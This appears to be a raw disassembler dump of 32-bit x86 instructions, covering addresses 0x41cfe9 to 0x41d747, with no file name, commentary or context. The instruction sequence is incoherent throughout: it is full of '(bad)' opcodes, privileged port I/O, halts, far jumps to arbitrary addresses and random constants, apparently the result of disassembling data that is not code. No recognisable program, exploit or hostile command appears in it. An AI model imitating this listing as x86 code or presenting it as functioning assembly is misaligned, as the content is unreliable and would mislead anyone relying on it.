  41cfe9:	or     eax,0x8fb0e90c
  41cfee:	lock mov ebp,0xee4ee906
  41cff4:	lds    esp,FWORD PTR [ecx+0x6d]
  41cff7:	out    0xd7,eax
  41cff9:	rcr    BYTE PTR [esi+0x5f],1
  41cffc:	int    0xe1
  41cffe:	stos   BYTE PTR es:[edi],al
  41cfff:	inc    eax
  41d000:	xor    edi,DWORD PTR [eax]
  41d002:	jnp    0x41cff7
  41d004:	retf   0xa57f
  41d007:	inc    eax
  41d008:	aas    
  41d009:	in     al,0x4e
  41d00b:	xor    dl,BYTE PTR [edx+edi*8]
  41d00e:	cli    
  41d00f:	mov    ?,WORD PTR [ebp+edx*1-0x351532b8]
  41d016:	hlt    
  41d017:	ror    DWORD PTR [eax],cl
  41d019:	sbb    BYTE PTR [ecx+0x33d678e6],dl
  41d01f:	jns    0x41d043
  41d021:	push   eax
  41d022:	add    al,0xa3
  41d024:	cwd    
  41d026:	pop    esp
  41d027:	repnz int3 
  41d029:	sti    
  41d02a:	mov    esi,0x7911549c
  41d02f:	or     edi,DWORD PTR [edi]
  41d031:	stos   BYTE PTR es:[edi],al
  41d032:	cmc    
  41d033:	sahf   
  41d034:	pop    edx
  41d035:	pop    ebp
  41d036:	push   ecx
  41d037:	aas    
  41d038:	dec    eax
  41d039:	xchg   ebx,eax
  41d03a:	ret    0xe7b2
  41d03d:	push   eax
  41d03e:	or     al,0x39
  41d040:	cmp    edx,DWORD PTR [edi+0x71]
  41d043:	mov    ah,0x88
  41d045:	arpl   WORD PTR [edx+0x3140ab9],sp
  41d04b:	sbb    DWORD PTR [edx+ecx*1],edx
  41d04e:	mov    dl,0x9
  41d050:	int    0x14
  41d052:	push   ss
  41d053:	mov    dh,0x5e
  41d055:	push   esp
  41d056:	mov    WORD PTR [edx+0x2f],es
  41d059:	stos   BYTE PTR es:[edi],al
  41d05a:	mov    ah,0x68
  41d05c:	xchg   edi,eax
  41d05d:	out    dx,eax
  41d05e:	xor    al,BYTE PTR [edx]
  41d060:	inc    ebp
  41d061:	jecxz  0x41d05b
  41d063:	dec    esi
  41d064:	jns    0x41d032
  41d066:	cdq    
  41d067:	mov    bl,0xcc
  41d069:	add    al,BYTE PTR [edi]
  41d06b:	push   ebx
  41d06c:	test   eax,0x787315f5
  41d071:	es (bad) 
  41d073:	pop    ebp
  41d074:	add    al,0x19
  41d076:	jle    0x41d022
  41d078:	and    BYTE PTR [ebp-0x4d],bl
  41d07b:	rcl    DWORD PTR [ebx-0x8],cl
  41d07e:	sahf   
  41d07f:	not    DWORD PTR [eax]
  41d081:	das    
  41d082:	xchg   BYTE PTR [ebp-0x72],bh
  41d085:	mov    edi,0xabddb7f2
  41d08a:	pop    cx
  41d08c:	lods   eax,DWORD PTR ds:[esi]
  41d08d:	loop   0x41d096
  41d08f:	out    0xd9,al
  41d091:	(bad)  
  41d092:	scas   eax,DWORD PTR es:[edi]
  41d093:	clc    
  41d094:	xchg   esi,eax
  41d095:	ss sbb al,0x31
  41d098:	rol    BYTE PTR [edi],1
  41d09a:	pop    ecx
  41d09b:	es (bad) 
  41d09d:	out    0x76,eax
  41d09f:	xor    BYTE PTR [ebx+eax*4],dl
  41d0a2:	sub    DWORD PTR [ecx-0x11],edi
  41d0a5:	cld    
  41d0a6:	bound  esp,QWORD PTR [ecx]
  41d0a8:	mov    WORD PTR [edx-0x2387f6f0],ds
  41d0ae:	ds jbe 0x41d0a0
  41d0b1:	ficomp DWORD PTR [ecx]
  41d0b3:	jp     0x41d120
  41d0b5:	mov    bl,BYTE PTR [esi]
  41d0b7:	test   al,0x38
  41d0b9:	jl     0x41d07b
  41d0bb:	ss std 
  41d0bd:	pusha  
  41d0be:	inc    ecx
  41d0bf:	lods   al,BYTE PTR ds:[esi]
  41d0c0:	test   al,0xed
  41d0c2:	mov    al,0x31
  41d0c4:	xchg   edx,eax
  41d0c5:	mov    ecx,0x9edfba3d
  41d0ca:	jo     0x41d0a3
  41d0cc:	pop    edi
  41d0cd:	push   edi
  41d0ce:	pop    eax
  41d0cf:	or     al,0x2e
  41d0d1:	xor    cl,BYTE PTR [eax-0x5c5f9da7]
  41d0d7:	fidivr DWORD PTR [eax+0x44c48cc2]
  41d0dd:	mov    ecx,0x637a641f
  41d0e2:	fs and al,0x3c
  41d0e5:	ins    DWORD PTR es:[edi],dx
  41d0e6:	pop    es
  41d0e7:	add    ah,BYTE PTR [ebx+0x5481a8a2]
  41d0ed:	mov    WORD PTR [ebx],?
  41d0ef:	imul   edx,edx,0xce3da56d
  41d0f5:	pop    ecx
  41d0f6:	xor    ebx,DWORD PTR [esi+0x4b4ed22d]
  41d0fc:	push   ds
  41d0fd:	fimul  DWORD PTR [edx]
  41d0ff:	and    BYTE PTR [esi+0xb],dl
  41d102:	(bad)  
  41d105:	repz aaa 
  41d107:	cmc    
  41d108:	lods   al,BYTE PTR ds:[esi]
  41d109:	inc    edx
  41d10a:	mov    edi,0x89e4c21f
  41d10f:	(bad)  
  41d110:	mov    ecx,0xa33b3371
  41d115:	fild   DWORD PTR [eax+0x10]
  41d118:	adc    edx,DWORD PTR [esi]
  41d11a:	out    dx,eax
  41d11b:	jnp    0x41d141
  41d11d:	aas    
  41d11e:	push   edx
  41d11f:	popf   
  41d120:	and    al,0xe9
  41d122:	test   DWORD PTR [edx],edi
  41d124:	aad    0x7c
  41d126:	cdq    
  41d127:	gs sbb dl,0x4e
  41d12b:	jb     0x41d15b
  41d12d:	dec    edi
  41d12e:	mov    eax,DWORD PTR [edi+0x31580768]
  41d134:	retf   
  41d135:	test   DWORD PTR [esi],esi
  41d137:	fwait
  41d138:	pop    edx
  41d139:	out    dx,eax
  41d13a:	leave  
  41d13b:	inc    ebp
  41d13c:	in     al,dx
  41d13d:	xchg   edi,eax
  41d13e:	and    bh,BYTE PTR [ebx+0x39]
  41d141:	jb     0x41d13a
  41d143:	cmc    
  41d144:	test   al,0x9e
  41d146:	sbb    al,0xbd
  41d148:	outs   dx,BYTE PTR ds:[esi]
  41d149:	push   ebp
  41d14a:	push   ecx
  41d14b:	(bad)  
  41d14d:	clc    
  41d14e:	mov    ch,0xc8
  41d150:	jmp    0xc919:0xeb738f64
  41d157:	cmp    al,0x13
  41d159:	stc    
  41d15a:	(bad)
  41d15d:	jnp    0x41d10a
  41d15f:	pop    eax
  41d160:	xlat   BYTE PTR ds:[ebx]
  41d161:	pusha  
  41d162:	jmp    0xa3e68abe
  41d167:	mov    al,0x12
  41d169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d16a:	push   0x80bf7040
  41d16f:	jbe    0x41d173
  41d171:	daa    
  41d172:	mov    ebp,0x81fd9dde
  41d177:	idiv   ah
  41d179:	mov    ds:0x7cedd7fb,al
  41d17e:	repz aaa 
  41d180:	aas    
  41d181:	mov    edi,0xc26bd53f
  41d186:	jnp    0x41d17b
  41d188:	and    BYTE PTR ds:0xcc502fde,0xea
  41d18f:	mov    edx,0x5a32edf5
  41d194:	(bad)  
  41d195:	enter  0x6d65,0xcc
  41d199:	sub    al,0x3a
  41d19b:	cmc    
  41d19c:	mov    DWORD PTR [esi-0x3b],eax
  41d19f:	cwde   
  41d1a0:	call   FWORD PTR ds:0x1b3ccf3e
  41d1a6:	or     al,0xdc
  41d1a8:	or     DWORD PTR [edi-0x3d],ecx
  41d1ab:	rol    bh,0x41
  41d1ae:	sbb    bh,BYTE PTR [ecx-0x59]
  41d1b1:	aam    0x57
  41d1b3:	mov    es,WORD PTR [ebx]
  41d1b5:	pop    ss
  41d1b6:	rcr    DWORD PTR [eax+0x176d3185],cl
  41d1bc:	pop    esp
  41d1bd:	mov    al,0xef
  41d1bf:	mov    BYTE PTR ds:0xc26881f3,ch
  41d1c5:	adc    esp,DWORD PTR [edx+0x751f75f2]
  41d1cb:	and    al,0xe
  41d1cd:	push   edx
  41d1ce:	dec    edi
  41d1cf:	jg     0x41d16f
  41d1d1:	imul   ecx,ecx,0x40
  41d1d4:	add    eax,0x27fafb56
  41d1d9:	and    bh,cl
  41d1db:	aam    0xbf
  41d1dd:	sbb    cl,BYTE PTR [ebp-0x4e0e7f96]
  41d1e3:	cld    
  41d1e4:	cwde   
  41d1e5:	shr    BYTE PTR [ebx+0x2bf9704],1
  41d1eb:	pop    ds
  41d1ec:	push   ecx
  41d1ed:	in     al,dx
  41d1ee:	lahf   
  41d1ef:	xor    al,0xbd
  41d1f1:	push   es
  41d1f2:	dec    esp
  41d1f3:	arpl   WORD PTR [edx],bx
  41d1f5:	pop    ds
  41d1f6:	inc    ebp
  41d1f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1f8:	jb     0x41d1cb
  41d1fa:	inc    eax
  41d1fb:	gs aas 
  41d1fd:	and    bh,BYTE PTR [eax+0xcc82410]
  41d203:	test   BYTE PTR [esi-0x80],al
  41d206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d207:	hlt    
  41d208:	mov    dl,0x7d
  41d20a:	xchg   ecx,eax
  41d20b:	push   ss
  41d20c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d20d:	xor    eax,0x981469fd
  41d212:	jmp    0xef0b:0xbd44c0f3
  41d219:	lods   eax,DWORD PTR ds:[esi]
  41d21a:	xchg   ecx,eax
  41d21b:	out    0xd2,al
  41d21d:	pusha  
  41d21e:	test   edx,ecx
  41d220:	sub    DWORD PTR [esi+eax*2],edx
  41d223:	(bad)  
  41d224:	std    
  41d225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d226:	mov    eax,cs:0xa2c28e17
  41d22c:	push   cs
  41d22d:	inc    edx
  41d22e:	mov    bl,0x9f
  41d230:	push   edx
  41d231:	out    dx,al
  41d232:	retf   
  41d233:	sar    BYTE PTR [ebp-0x7264dc2a],cl
  41d239:	or     eax,0x67bc7c65
  41d23e:	jnp    0x41d274
  41d240:	xlat   BYTE PTR ds:[ebx]
  41d241:	mov    edx,0xd0cd40be
  41d246:	xor    eax,0xfbd4c375
  41d24b:	mov    al,ds:0x6147af55
  41d250:	push   ecx
  41d251:	push   ebp
  41d252:	mov    ebx,0x86414c6
  41d257:	mov    ?,esp
  41d259:	mov    al,0x6b
  41d25b:	mov    edx,ds
  41d25d:	stc    
  41d25e:	adc    DWORD PTR [ebx-0x26],ecx
  41d261:	jp     0x41d287
  41d263:	jle    0x41d241
  41d265:	and    eax,0x263b6919
  41d26a:	or     eax,0xdd1e6ae7
  41d26f:	mov    ebx,0x60590e36
  41d274:	(bad)  
  41d275:	mov    ?,WORD PTR [ebx+0x25]
  41d278:	sub    al,0x31
  41d27a:	repz hlt 
  41d27c:	xchg   BYTE PTR [eax+0x42],al
  41d27f:	and    al,0x4d
  41d281:	xlat   BYTE PTR ds:[ebx]
  41d282:	cmp    bl,BYTE PTR [edi-0x259099e6]
  41d288:	std    
  41d289:	pop    edx
  41d28a:	sbb    esi,edx
  41d28c:	pop    ss
  41d28d:	sub    DWORD PTR [edx+0x55ad3e8c],edi
  41d293:	cmp    dl,BYTE PTR [esi+esi*1]
  41d296:	pop    ss
  41d297:	div    BYTE PTR [ebx]
  41d299:	inc    esp
  41d29a:	pop    ds
  41d29b:	jns    0x41d2e7
  41d29d:	clc    
  41d29e:	inc    ebp
  41d29f:	pop    es
  41d2a0:	repnz dec edi
  41d2a2:	pop    esi
  41d2a3:	rcl    DWORD PTR [eax-0x33],cl
  41d2a6:	ins    BYTE PTR es:[edi],dx
  41d2a7:	dec    esi
  41d2a8:	and    eax,0xa0960868
  41d2ad:	test   eax,0x429ea3b2
  41d2b2:	add    eax,0x51cd50f5
  41d2b7:	xchg   al,ch
  41d2b9:	pop    edx
  41d2ba:	mov    ecx,0xbbb3c7a8
  41d2bf:	(bad)  
  41d2c0:	adc    BYTE PTR [edi+0x156cfb88],ah
  41d2c6:	inc    edx
  41d2c7:	iret   
  41d2c8:	push   eax
  41d2c9:	push   0xdd84d306
  41d2ce:	outs   dx,DWORD PTR ds:[esi]
  41d2cf:	xchg   ecx,eax
  41d2d0:	jecxz  0x41d333
  41d2d2:	and    al,0xda
  41d2d4:	fbstp  TBYTE PTR [edi]
  41d2d6:	scas   al,BYTE PTR es:[edi]
  41d2d7:	ret    
  41d2d8:	(bad)
  41d2db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2dc:	push   ebx
  41d2dd:	ret    
  41d2de:	out    dx,al
  41d2df:	pop    ebx
  41d2e0:	add    eax,0xc0a467d9
  41d2e5:	mov    eax,0x5a30c0c6
  41d2ea:	inc    edx
  41d2eb:	sti    
  41d2ec:	ins    BYTE PTR es:[edi],dx
  41d2ed:	ss adc edi,edx
  41d2f0:	aas    
  41d2f1:	(bad)  
  41d2f2:	lods   al,BYTE PTR ds:[esi]
  41d2f3:	pop    ebx
  41d2f4:	lea    esp,[esi+0x8]
  41d2f7:	push   cs
  41d2f8:	cmp    BYTE PTR [ebp+0x1f95076f],0x70
  41d2ff:	ret    
  41d300:	push   ds
  41d301:	ss inc ebx
  41d303:	das    
  41d304:	je     0x41d2ee
  41d306:	jmp    0xca888906
  41d30b:	adc    eax,DWORD PTR ds:0xeae9a202
  41d311:	lods   al,BYTE PTR ds:[esi]
  41d312:	dec    esp
  41d313:	je     0x41d2dc
  41d315:	adc    DWORD PTR [ebx-0x72],ebp
  41d318:	sbb    eax,0xaeacba40
  41d31d:	fcomp  st(0)
  41d31f:	into   
  41d320:	pop    ecx
  41d321:	ins    BYTE PTR es:[edi],dx
  41d322:	xor    esi,ecx
  41d324:	retf   
  41d325:	ins    BYTE PTR es:[edi],dx
  41d326:	jo     0x41d2e2
  41d328:	call   0x1302970a
  41d32d:	inc    ebx
  41d32e:	leave  
  41d32f:	sti    
  41d330:	push   ds
  41d331:	and    BYTE PTR [ecx],ah
  41d333:	jl     0x41d2c5
  41d335:	enter  0x4b25,0x6e
  41d339:	popa   
  41d33a:	push   0x58
  41d33c:	cmp    eax,0x8ae76ca4
  41d341:	comiss xmm4,DWORD PTR cs:[eax+0x3cdbab3]
  41d349:	jmp    FWORD PTR [edx+eiz*8-0x32]
  41d34d:	inc    eax
  41d34e:	jne    0x41d36e
  41d350:	aas    
  41d351:	sub    eax,0x213479eb
  41d356:	dec    edi
  41d357:	in     al,0x5a
  41d359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d35a:	popa   
  41d35b:	xchg   ebx,eax
  41d35c:	in     eax,dx
  41d35d:	idiv   DWORD PTR [esi+0x6f]
  41d360:	mov    ecx,0x28d20275
  41d365:	add    ebp,DWORD PTR [esi-0x71b9977]
  41d36b:	lock rcl BYTE PTR [ebx-0x71],0x44
  41d370:	pop    esi
  41d371:	scas   eax,DWORD PTR es:[edi]
  41d372:	cmp    edi,DWORD PTR [esi+esi*4]
  41d375:	clc    
  41d376:	sbb    al,0xcc
  41d378:	inc    esi
  41d379:	iret   
  41d37a:	and    eax,0x96565058
  41d37f:	xchg   DWORD PTR [eax],edi
  41d381:	and    esp,DWORD PTR [ecx+0x18]
  41d384:	add    esi,DWORD PTR [eax+0x6ffa2b93]
  41d38a:	hlt    
  41d38b:	push   eax
  41d38c:	jmp    0xff7ffe5f
  41d391:	mov    cl,0x56
  41d393:	cli    
  41d394:	nop
  41d395:	mov    BYTE PTR [edi-0x4e],0x92
  41d399:	arpl   WORD PTR [ebx+0x7b],si
  41d39c:	pushf  
  41d39d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d39e:	mov    al,ds:0x785d5211
  41d3a3:	mov    ch,0x6
  41d3a5:	push   0xe4dfabca
  41d3aa:	inc    ebp
  41d3ab:	je     0x41d3f5
  41d3ad:	popa   
  41d3ae:	mov    ss,WORD PTR [eax+0x2c09584e]
  41d3b4:	test   al,0x3b
  41d3b6:	adc    DWORD PTR [ecx+0x38cb9920],edx
  41d3bc:	add    al,BYTE PTR [edx]
  41d3be:	inc    ecx
  41d3bf:	in     al,dx
  41d3c0:	pop    esi
  41d3c1:	rcr    cl,cl
  41d3c3:	addr16 ss icebp 
  41d3c6:	pop    ebx
  41d3c7:	(bad)  
  41d3c8:	jl     0x41d3f0
  41d3ca:	pop    ebx
  41d3cb:	pop    DWORD PTR [esi-0x6a]
  41d3ce:	out    0xf3,al
  41d3d0:	les    eax,FWORD PTR [ecx]
  41d3d2:	ss retf 0xb940
  41d3d6:	xchg   edi,eax
  41d3d7:	pop    es
  41d3d8:	and    DWORD PTR [ebx],ecx
  41d3da:	in     eax,0xe5
  41d3dc:	add    ebp,DWORD PTR [esi]
  41d3de:	push   0x2e
  41d3e0:	push   es
  41d3e1:	fwait
  41d3e2:	add    eax,0xa47730ab
  41d3e7:	mov    ebp,0xd1f69144
  41d3ec:	mov    esi,0x4982465f
  41d3f1:	dec    esp
  41d3f2:	add    DWORD PTR [edi],ebx
  41d3f4:	cmp    eax,0x408c36f
  41d3f9:	push   ebx
  41d3fa:	addr16 xchg esi,eax
  41d3fc:	shr    BYTE PTR [ebp+edi*1+0x53],1
  41d400:	dec    esi
  41d401:	mov    ebx,0x7746acd
  41d406:	pop    ebp
  41d407:	mov    ah,0x4d
  41d409:	cwde   
  41d40a:	out    dx,eax
  41d40b:	inc    ebp
  41d40c:	(bad)  
  41d40d:	and    eax,DWORD PTR [ecx-0x3141551b]
  41d413:	pop    ecx
  41d414:	push   esi
  41d415:	mov    bl,BYTE PTR [ecx-0x1b]
  41d418:	adc    al,0x32
  41d41a:	xchg   edi,eax
  41d41b:	fld    QWORD PTR [edx+0x17]
  41d41e:	test   DWORD PTR [edx-0x78b59308],ebx
  41d424:	mov    gs,WORD PTR [eax-0x3d]
  41d427:	mov    eax,DWORD PTR [ecx+edx*1]
  41d42a:	dec    edx
  41d42b:	stc    
  41d42c:	(bad)  
  41d42d:	cmp    dl,BYTE PTR [edi-0x795d7abc]
  41d433:	pop    edi
  41d434:	mov    ds:0xdf687ae3,eax
  41d439:	fcom   DWORD PTR [edx]
  41d43b:	add    BYTE PTR [edi-0x2f],0xb9
  41d43f:	and    edx,ebx
  41d441:	add    BYTE PTR [ecx+0xdf430e2],bl
  41d447:	xor    BYTE PTR [esi+0x5],ch
  41d44a:	xchg   ecx,eax
  41d44b:	(bad)  
  41d44d:	into   
  41d44e:	outs   dx,BYTE PTR ds:[esi]
  41d44f:	jb     0x41d476
  41d451:	nop
  41d452:	jnp    0x41d3f1
  41d454:	fnstsw WORD PTR [ebx]
  41d456:	test   DWORD PTR [esi-0x79],esi
  41d459:	xor    ch,cl
  41d45b:	repnz ror BYTE PTR [edi],1
  41d45e:	dec    eax
  41d45f:	call   0x5766:0x13caedcb
  41d466:	push   ebx
  41d467:	retf   0xf22a
  41d46a:	sahf   
  41d46b:	gs push edi
  41d46d:	dec    edx
  41d46e:	inc    ebx
  41d46f:	(bad)  
  41d470:	pusha  
  41d471:	add    DWORD PTR [ebp+0x598bffa4],edi
  41d477:	dec    ecx
  41d478:	dec    esp
  41d479:	fdivr  DWORD PTR [ebx-0x61466985]
  41d47f:	mov    BYTE PTR [esi-0x77],0x9c
  41d483:	mov    eax,0x97e3c6d
  41d488:	push   ebx
  41d489:	mov    ecx,0xf120bf54
  41d48e:	or     BYTE PTR [edi],ah
  41d490:	sub    BYTE PTR [ecx+0x39],bl
  41d493:	shl    BYTE PTR [esi+0x53],cl
  41d496:	adc    BYTE PTR [edi-0x39],0xe6
  41d49a:	mov    ds:0x9e10b5e6,eax
  41d49f:	mov    ch,0xdc
  41d4a1:	pushf  
  41d4a2:	retf   
  41d4a3:	ret    0x2201
  41d4a6:	jbe    0x41d4d2
  41d4a8:	sti    
  41d4a9:	add    al,0xbe
  41d4ab:	jns    0x41d48a
  41d4ad:	pop    ebx
  41d4ae:	jge    0x41d504
  41d4b0:	add    eax,esp
  41d4b2:	dec    ebx
  41d4b3:	mov    ebp,0x7cad1d6b
  41d4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4b9:	js     0x41d523
  41d4bb:	mov    ds:0x11b70a70,al
  41d4c0:	adc    ebp,esp
  41d4c2:	stos   DWORD PTR es:[edi],eax
  41d4c3:	and    DWORD PTR [ebp+ecx*4-0x1a5932f6],ebp
  41d4ca:	clc    
  41d4cb:	out    0xa1,eax
  41d4cd:	aad    0x37
  41d4cf:	clc    
  41d4d0:	and    al,BYTE PTR [edi+0x2b]
  41d4d3:	xor    ch,bl
  41d4d5:	xor    al,0xba
  41d4d7:	jb     0x41d4f2
  41d4d9:	inc    edx
  41d4da:	loope  0x41d4f0
  41d4dc:	mov    ebp,0xaf2f016
  41d4e1:	mov    ah,0x2f
  41d4e3:	lock or eax,0xd99678cb
  41d4e9:	aam    0x3b
  41d4eb:	inc    edx
  41d4ec:	arpl   bp,sp
  41d4ee:	adc    al,ah
  41d4f0:	scas   al,BYTE PTR es:[edi]
  41d4f1:	daa    
  41d4f2:	mov    ecx,0xc975c62a
  41d4f7:	pop    esp
  41d4f8:	or     al,0x92
  41d4fa:	in     eax,dx
  41d4fb:	jl     0x41d492
  41d4fd:	repz cs inc esi
  41d500:	adc    al,0x5e
  41d502:	xor    BYTE PTR [edi+0xf6eda42],bh
  41d508:	jge    0x41d552
  41d50a:	mov    WORD PTR [ecx+ebp*1+0x57],cs
  41d50e:	jle    0x41d53d
  41d510:	outs   dx,BYTE PTR ds:[esi]
  41d511:	es mov esp,0x63bbca8b
  41d517:	stos   BYTE PTR es:[edi],al
  41d518:	in     eax,0xf4
  41d51a:	xor    al,0x61
  41d51c:	in     al,0xe9
  41d51e:	imul   esi,DWORD PTR [ebx-0x6c],0xffffffed
  41d522:	or     al,0xa8
  41d524:	mov    ch,0xb1
  41d526:	enter  0xf215,0x7e
  41d52a:	paddsw mm5,QWORD PTR [ecx]
  41d52d:	inc    ebx
  41d52e:	dec    esi
  41d52f:	cld    
  41d530:	out    0x98,al
  41d532:	mov    ah,0x7
  41d534:	xchg   BYTE PTR [ecx],dl
  41d536:	adc    eax,0x82f3913
  41d53b:	mov    ch,BYTE PTR [esi-0x706fe576]
  41d541:	and    eax,DWORD PTR [edi]
  41d543:	cmp    al,0x98
  41d545:	and    DWORD PTR [ecx],esi
  41d547:	jmp    0x41d5a1
  41d549:	cmp    eax,0x5f90d87
  41d54e:	int    0xe1
  41d550:	xor    ch,bl
  41d552:	jle    0x41d4d8
  41d554:	or     ebx,DWORD PTR [eax-0x14]
  41d557:	cli    
  41d558:	shl    BYTE PTR [esi+0x4c],1
  41d55b:	call   0xea48:0x3310a54b
  41d562:	dec    ebx
  41d563:	daa    
  41d564:	lds    ecx,FWORD PTR [edi-0x10]
  41d567:	mov    esp,0xdce44b4b
  41d56c:	push   cs
  41d56d:	sbb    DWORD PTR [ebp+0xe],ebp
  41d570:	mov    esp,0xf8fd4e20
  41d575:	cmp    DWORD PTR [edx+0x7b],0x65f5687c
  41d57c:	jb     0x41d506
  41d57e:	(bad)  
  41d57f:	fwait
  41d580:	leave  
  41d581:	sbb    BYTE PTR [eax-0x56],dh
  41d584:	sub    dl,ah
  41d586:	adc    al,0x6e
  41d588:	mov    eax,ds:0x923514d8
  41d58d:	imul   ebx,DWORD PTR [ebp+edi*1-0x2be1c757],0x2f64e027
  41d598:	out    dx,eax
  41d599:	pop    esp
  41d59a:	je     0x41d53b
  41d59c:	add    DWORD PTR [eax-0x38],eax
  41d59f:	push   0x24a2c240
  41d5a4:	lea    esp,[edi]
  41d5a6:	xchg   dl,bl
  41d5a8:	dec    ecx
  41d5a9:	mov    ds:0x6322f905,al
  41d5ae:	jne    0x41d601
  41d5b0:	xor    edx,esi
  41d5b2:	pop    ebx
  41d5b3:	aas    
  41d5b4:	mov    bh,BYTE PTR [ecx-0x7c147fce]
  41d5ba:	outs   dx,DWORD PTR ds:[esi]
  41d5bb:	xchg   ecx,eax
  41d5bc:	nop
  41d5bd:	out    0xa8,eax
  41d5bf:	fdivr  QWORD PTR [edx]
  41d5c1:	jbe    0x41d5d5
  41d5c3:	in     al,dx
  41d5c4:	inc    ecx
  41d5c5:	loopne 0x41d572
  41d5c7:	sbb    BYTE PTR [eax+eax*2],0x9a
  41d5cb:	xchg   esp,eax
  41d5cc:	call   0x2d99b98c
  41d5d1:	rol    BYTE PTR [eax+0x77ae058f],1
  41d5d7:	mov    esp,0x52df0748
  41d5dc:	xchg   esi,eax
  41d5dd:	ret    
  41d5de:	and    eax,0x7e455538
  41d5e3:	das    
  41d5e4:	push   ss
  41d5e5:	(bad)  
  41d5e6:	out    dx,al
  41d5e7:	mov    ebx,DWORD PTR [edi+0x7c]
  41d5ea:	or     ch,ah
  41d5ec:	inc    edi
  41d5ed:	(bad)  
  41d5ee:	push   ebx
  41d5ef:	mov    BYTE PTR ds:0xbeb5d772,0xe
  41d5f6:	mov    DWORD PTR [eax],edi
  41d5f8:	call   0x215cc75f
  41d5fd:	cs int3 
  41d5ff:	inc    eax
  41d600:	stc    
  41d601:	scas   al,BYTE PTR es:[edi]
  41d602:	gs loop 0x41d5fa
  41d605:	in     al,dx
  41d606:	pop    es
  41d607:	xchg   esi,eax
  41d608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d609:	out    dx,al
  41d60a:	adc    BYTE PTR ds:0x7b99ee38,0x21
  41d611:	xchg   DWORD PTR [ecx-0x7e96aea6],esp
  41d617:	jbe    0x41d65d
  41d619:	sub    dl,BYTE PTR [edx+edx*1]
  41d61c:	call   DWORD PTR [ebp-0x38a3599c]
  41d622:	cld    
  41d623:	sahf   
  41d624:	dec    edi
  41d625:	gs mov cl,0x53
  41d628:	xchg   edx,ebx
  41d62a:	and    eax,0x9e7df6c8
  41d62f:	add    BYTE PTR [esi-0x31],dl
  41d632:	fld    TBYTE PTR [ebx]
  41d634:	add    BYTE PTR [edi+0x31119ca3],dl
  41d63a:	add    al,0xcf
  41d63c:	xor    BYTE PTR [ebp+0x24],dh
  41d63f:	(bad)  
  41d640:	dec    eax
  41d641:	xor    cl,BYTE PTR [esi-0x30]
  41d644:	adc    al,0x9
  41d646:	xchg   esp,eax
  41d647:	xor    eax,0xf060cab2
  41d64c:	mov    ah,dl
  41d64e:	push   ecx
  41d64f:	xor    BYTE PTR [eax-0x11],0x6a
  41d653:	sbb    bl,BYTE PTR [eax+eax*8-0x42]
  41d657:	pop    ebx
  41d658:	jbe    0x41d63a
  41d65a:	add    DWORD PTR [edx-0x280ffaea],edx
  41d660:	or     DWORD PTR [edi-0x505f5ed6],edi
  41d666:	inc    edi
  41d667:	imul   edx,edx,0x5cf3df7
  41d66d:	or     DWORD PTR [ebp+0x6a],esi
  41d670:	icebp  
  41d671:	fmul   DWORD PTR [ebx-0x45577656]
  41d677:	mov    ch,dl
  41d679:	or     bh,dl
  41d67b:	sbb    edx,edx
  41d67d:	test   DWORD PTR [edi],ebx
  41d67f:	pusha  
  41d680:	or     DWORD PTR [ebx],0x2197996f
  41d686:	sbb    edi,DWORD PTR [edx-0x25136280]
  41d68c:	jb     0x41d702
  41d68e:	inc    eax
  41d68f:	add    edx,eax
  41d691:	dec    ebp
  41d692:	cmp    ch,0x4
  41d695:	mov    eax,0x11caa48a
  41d69a:	std    
  41d69b:	call   0xa352d3a
  41d6a0:	xlat   BYTE PTR ds:[ebx]
  41d6a1:	and    eax,0x33ed827a
  41d6a6:	xchg   esi,eax
  41d6a7:	mov    eax,0x553ee51b
  41d6ac:	dec    ebp
  41d6ad:	mov    ecx,0x5db8ccab
  41d6b2:	jle    0x41d72d
  41d6b4:	xchg   ecx,esp
  41d6b6:	push   cs
  41d6b7:	push   0xffffffeb
  41d6b9:	test   DWORD PTR [eax-0x21],0xd83def15
  41d6c0:	out    0x3b,al
  41d6c2:	pop    ebx
  41d6c3:	adc    DWORD PTR [edx+0x523c0fa5],edi
  41d6c9:	push   esi
  41d6ca:	adc    eax,0x56840046
  41d6cf:	and    BYTE PTR [ebx-0x67f81da7],al
  41d6d5:	sub    BYTE PTR [ecx+0x61],0x65
  41d6d9:	repnz cmp BYTE PTR [ecx+esi*4+0x7fd82004],ah
  41d6e1:	push   esi
  41d6e2:	mov    eax,ds:0x3db16372
  41d6e7:	aas    
  41d6e8:	jne    0x41d75d
  41d6ea:	pop    esi
  41d6eb:	add    BYTE PTR [edi-0x63],bl
  41d6ee:	lock xchg edi,eax
  41d6f0:	inc    edi
  41d6f1:	push   edi
  41d6f2:	add    ch,BYTE PTR [ebp-0x4]
  41d6f5:	rol    eax,1
  41d6f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6f8:	dec    edi
  41d6f9:	in     eax,0xc6
  41d6fb:	push   ss
  41d6fc:	mov    cl,0x71
  41d6fe:	je     0x41d746
  41d700:	jge    0x41d773
  41d702:	cmp    bl,BYTE PTR [edx-0x1f]
  41d705:	jne    0x41d757
  41d707:	rcl    DWORD PTR [ebp-0x2801d1e2],0xe8
  41d70e:	loope  0x41d6a7
  41d710:	fild   WORD PTR [ecx]
  41d712:	mov    eax,ds:0xc34bc0f4
  41d717:	out    dx,al
  41d718:	lods   eax,DWORD PTR ds:[esi]
  41d719:	mov    ebx,0x4b1d4bae
  41d71e:	mov    ecx,0x7c460107
  41d723:	push   0xffffffce
  41d725:	lock and bl,BYTE PTR ss:[ebx+0x35]
  41d72a:	cmp    esi,DWORD PTR [ebp+0x40]
  41d72d:	out    dx,al
  41d72e:	jg     0x41d703
  41d730:	sub    al,0xce
  41d732:	jecxz  0x41d72a
  41d734:	adc    BYTE PTR [edi-0x2c],cl
  41d737:	repz fwait
  41d739:	jg     0x41d6ef
  41d73b:	mov    dl,BYTE PTR [edi+0x263b07e5]
  41d741:	shr    DWORD PTR [ecx-0x78],0x5f
  41d745:	jge    0x41d734
  41d747:	(bad)  
